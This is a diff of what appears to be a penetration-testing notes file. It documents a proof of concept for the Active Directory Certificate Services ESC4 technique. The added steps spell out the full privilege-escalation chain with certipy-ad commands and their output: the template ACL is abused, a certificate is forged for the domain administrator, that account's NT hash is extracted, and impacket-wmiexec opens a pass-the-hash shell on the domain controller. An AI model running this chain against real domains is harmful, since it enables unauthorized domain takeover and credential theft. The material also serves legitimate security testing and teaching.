@@ -20,9 +20,9 @@ Conditions making an AD environment vulnerable to "ESC4" - Vulnerable Certificat
 -----------------------------------------------------------------------------------------------
 Various tools can be used to identify and exploit the ADCS Domain Escalation technique "ESC4"
 -----------------------------------------------------------------------------------------------
+- Certipy.py / certipy-ad (https://github.com/ly4k/Certipy)
 - Certutil (native windows command)
 - Certify.exe (https://github.com/GhostPack/Certify)
-- Certipy.py / certipy-ad (https://github.com/ly4k/Certipy)
 - PSPKIAudit.psm1 (https://github.com/GhostPack/PSPKIAudit)
 - PassTheCert.exe (https://github.com/AlmondOffSec/PassTheCert)
 - ...
@@ -35,12 +35,12 @@ Info
 
 
 ========================================================================================================================================
-PoC - Privilege escalation from Domain User to Domain Admin by exploiting the "Vulnerable Certificate Template Access Control" (ESC4) 
+PoC - Privilege escalation from Domain User to Domain Admin by exploiting a "Vulnerable Certificate Template Access Control" (ESC4) 
 ========================================================================================================================================
 
-=================================================================================================================
-STEP 1 - ADCS enumeration using a low privileged domain user and the tool "certipy-ad"
-=================================================================================================================
+==============================================================================================================================
+STEP 1 - ADCS enumeration using a low-privileged domain user and the tool "Certipy.py" (which is named "certipy-ad" in Kali)
+==============================================================================================================================
 
 jeff@kali:~$ sudo apt-get install certipy-ad
 Reading package lists... Done
@@ -199,23 +199,90 @@ root@kali:/home/jeff# cat 20230606011147_templates.json
         }
 <SNIP>
 
+
+=> Conclusion: The certificate template "Exchange_User_Template" is prone to the domain privesc vulnerability "ESC4"
+--------------------------------------------------------------------------------------------------------------------
+The domain group "Authenticated Users" (SID "S-1-5-11") has the following insecure permissions over the certficate template "Exchange_User_Template":
+  > WriteOwner: Can modify the owner to an attacker-controlled principal.
+  > WriteDacl: Can modify access control to grant an attacker FullControl.
+  > WriteProperty: Can edit any properties.
+
+Note
+-----
 rpcclient $> lookupnames "Authenticated Users"
 Authenticated Users S-1-5-11 (Well-known Group: 5)
 
+===========================================================================================================================
+STEP 3 - Exploit the "ESC4" vulnerability with "certipy-ad" to escalate your privileges from a Domain User to Domain Admin
+===========================================================================================================================
 
-=> Conclusion: The "Exchange_User_Template" is prone to the domain privesc vulnerability "ESC4"
--------------------------------------------------------------------------------------------------
-Indeed, the group "Authenticated Users" ( SID "S-1-5-11") has the following permissions over the certficate template "Exchange_User_Template":
-  > WriteOwner: Can modify the owner to an attacker-controlled principal.
-  > WriteDacl: Can modify access control to grant an attacker FullControl.
-  > WriteProperty: Can edit any properties
+3.1. First, run the following command with "certpy-ad" to:
+     + save the initial configuration of the certificate "Exchange_User_Template" (to be able to restore it later)
+     + modify the template configuration, which will make it vulnerable to the ESC1 privesc technique.
+--------------------------------------------------------------------------------------------------------------------
+
+root@kali:/home/jeff# certipy-ad template -u LowPrivUser@company.work -p 'SuperGenialPwd' -target dc1.company.work -template Exchange_User_Template -save-old -dc-ip 192.168.1.167
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Saved old configuration for 'Exchange_User_Template' to 'Exchange_User_Template.json'
+[*] Updating certificate template 'Exchange_User_Template'
+[*] Successfully updated 'Exchange_User_Template'
 
 
-=================================================================================================================
-STEP 3 - Exploit the "ESC4" vulnerability to escalate your privileges from a Domain User to Domain Admin
-=================================================================================================================
+3.2. The certificate template "Exchange_User_Template" is now vulnerable to the ESC1 privesc technique and we can request a certificate based on the template 
+     "Exchange_User_Template" with the Domain Admin account "COMPANY\Administrator" specified as the Subject Alternative Name (SAN).
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+root@kali:/home/jeff# certipy-ad req -u LowPrivUser@company.work -p 'SuperGenialPwd'  -target 192.168.1.167 -ca company-DC1-CA -template Exchange_User_Template -upn administrator@company.work -dc-ip 192.168.1.167
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 11
+[*] Got certificate with UPN 'administrator@company.work'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
 
 
+3.3. Restore the old template configuration
+--------------------------------------------
+
+root@kali:/home/jeff# certipy-ad template -u LowPrivUser@company.work -p 'SuperGenialPwd'  -target dc1.company.work -template Exchange_User_Template -configuration Exchange_User_Template.json -dc-ip 192.168.1.167
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Updating certificate template 'Exchange_User_Template'
+[*] Successfully updated 'Exchange_User_Template'
 
 
+3.4. Finally, collect the password hash of the Domain Admin account "Company\Administrator" and then log into the DC as "Domain Admin" using "impacket-wmiexec"
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+root@kali:/home/jeff# certipy-ad auth -pfx /home/jeff/administrator.pfx -domain company.work -username administrator -dc-ip 192.168.1.167
+Certipy v4.3.0 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@company.work
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@company.work': aad3b435b51404eeaad3b435b51404ee:cf3a5525ee94142<SNIP>
+
+
+root@kali:/home/jeff# impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414<SNIP> administrator@192.168.1.167
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+
+C:\> hostname
+DC1
+
+C:\> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name             SID                                         
+===================== ============================================
+company\administrator S-1-5-21-844310393-2305947092-3799914435-500
+<SNIP>
